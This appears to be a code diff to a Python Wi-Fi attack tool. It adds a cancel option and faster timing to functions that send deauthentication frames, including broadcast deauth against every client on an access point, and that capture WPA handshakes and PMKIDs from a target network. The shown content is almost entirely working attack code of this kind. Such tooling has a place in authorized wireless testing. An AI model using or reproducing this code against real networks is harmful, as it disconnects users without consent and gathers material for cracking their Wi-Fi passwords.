@@ -25,22 +25,26 @@ def _noop(*_a, **_k):
 
 
 # --- deauth -------------------------------------------------------------------
-def send_deauth(iface, bssid, client, channel, bursts=1, log=_noop):
-    """Deauth a single client, or BROADCAST to hit every client on the AP."""
+def send_deauth(iface, bssid, client, channel, bursts=1, log=_noop, cancel=None):
+    """Deauth a single client, or BROADCAST to hit every client on the AP.
+    Interruptible via `cancel` so Stop responds promptly."""
     set_channel(channel, iface)
     target = client or BROADCAST
     packets = dot11.build_deauth(bssid, target)
     label = "ALL clients" if target == BROADCAST else target
     for _ in range(bursts):
+        if cancel and cancel.is_set():
+            return
         log(f"Sending {DEAUTH_BURST} deauth frames to {label} on {bssid}")
-        sendp(packets, iface=iface, count=DEAUTH_BURST, inter=0.05, verbose=False)
-        time.sleep(0.2)
+        sendp(packets, iface=iface, count=DEAUTH_BURST, inter=0.01, verbose=False)
+        if cancel and cancel.wait(0.2):   # inter-burst pause that also honors Stop
+            return
 
 
 # --- handshake capture --------------------------------------------------------
 @contextmanager
 def capture_handshakes(iface, bssid, outfile, handshake_limit=1,
-                       timeout=HANDSHAKE_TIMEOUT, log=_noop):
+                       timeout=HANDSHAKE_TIMEOUT, log=_noop, cancel=None):
     handshakes = {}
     captured = []
     state = {"got_beacon": False}
@@ -85,15 +89,20 @@ def capture_handshakes(iface, bssid, outfile, handshake_limit=1,
         log(f"Caught {msg} from {client}")
         check_done()
 
-    t = Thread(target=sniff, kwargs={
-        "iface": iface, "prn": handler,
-        "stop_filter": lambda p: stop.is_set(), "store": False,
-    }, daemon=True)
+    def sniffer():
+        # 1s bursts so the thread (and Stop) react promptly on any channel
+        while not stop.is_set() and not (cancel and cancel.is_set()):
+            sniff(iface=iface, prn=handler, store=False, timeout=1)
+
+    t = Thread(target=sniffer, daemon=True)
     t.start()
     log(f"Listening for handshakes on {bssid}…")
 
     def wait():
-        stop.wait(timeout)
+        end = time.time() + timeout
+        while time.time() < end and not (cancel and cancel.is_set()):
+            if stop.wait(0.3):   # handshake captured
+                return
 
     try:
         yield handshakes, wait
@@ -109,7 +118,7 @@ def capture_handshakes(iface, bssid, outfile, handshake_limit=1,
 
 # --- PMKID capture ------------------------------------------------------------
 @contextmanager
-def capture_pmkid(iface, bssid, client_mac, outfile, timeout=PMKID_TIMEOUT, log=_noop):
+def capture_pmkid(iface, bssid, client_mac, outfile, timeout=PMKID_TIMEOUT, log=_noop, cancel=None):
     captured = []
     status = {"beacon": False, "assoc_resp": False, "pmkid": False}
     stop = Event()
@@ -135,16 +144,20 @@ def capture_pmkid(iface, bssid, client_mac, outfile, timeout=PMKID_TIMEOUT, log=
                 log("Caught M1 but no PMKID — target likely not vulnerable.")
             stop.set()
 
-    t = Thread(target=sniff, kwargs={
-        "iface": iface, "prn": handler,
-        "stop_filter": lambda p: stop.is_set(), "store": False,
-    }, daemon=True)
+    def sniffer():
+        while not stop.is_set() and not (cancel and cancel.is_set()):
+            sniff(iface=iface, prn=handler, store=False, timeout=1)
+
+    t = Thread(target=sniffer, daemon=True)
     t.start()
     time.sleep(1)
     log(f"Soliciting PMKID from {bssid}…")
 
     def wait():
-        stop.wait(timeout)
+        end = time.time() + timeout
+        while time.time() < end and not (cancel and cancel.is_set()):
+            if stop.wait(0.3):
+                return
 
     try:
         yield status, wait
